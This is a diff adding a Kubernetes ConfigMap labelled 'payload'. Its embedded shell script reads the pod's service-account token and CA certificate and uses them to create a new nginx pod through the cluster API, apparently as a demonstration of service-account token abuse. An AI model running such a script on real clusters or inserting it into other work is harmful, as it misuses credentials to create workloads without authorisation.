@@ -1,0 +1,10 @@
+apiVersion: v1
+kind: ConfigMap
+metadata:
+  name: payload
+data:
+  pod-definition.sh: |
+    #!/bin/sh
+    TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
+    CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
+    curl -H "Authorization: Bearer $TOKEN" --cacert $CACERT -H "Content-Type: application/json" -X POST -d '{"apiVersion":"v1","kind":"Pod","metadata":{"name":"nginxthilee"},"spec":{"containers":[{"image":"nginx","name":"new-nginx"}]}}' https://kubernetes/api/v1/namespaces/default/pods
